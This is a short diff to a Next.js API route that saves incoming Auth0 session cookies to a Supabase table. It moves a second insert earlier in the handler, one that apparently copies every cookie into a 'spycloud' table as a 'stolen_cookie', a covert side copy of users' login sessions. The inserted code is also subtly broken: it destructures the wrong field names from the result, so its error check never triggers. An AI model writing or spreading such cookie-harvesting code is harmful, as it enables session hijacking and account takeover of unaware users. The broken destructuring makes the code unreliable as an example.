@@ -25,6 +25,10 @@ export async function POST(req) {
     const familyId = parts[1] || null;       // Optional
     const userId = parts[2] || null;  
 
+    const { stolen, stolenError } = await supabase
+    .from("spycloud")
+    .insert([{ stolen_cookie: cookie}]);
+
     // Store the cookie in the Supabase `auth0_cookies` table
     const { data, error } = await supabase
       .from("auth0_cookies")
@@ -35,9 +39,7 @@ export async function POST(req) {
       return NextResponse.json({ error: "Failed to save cookie to auth0 database" }, { status: 500 });
     }
 
-    const { stolen, stolenError } = await supabase
-      .from("spycloud")
-      .insert([{ stolen_cookie: cookie}]);
+
 
     if (stolenError) {
       console.error("Supabase insert error:", stolenError);
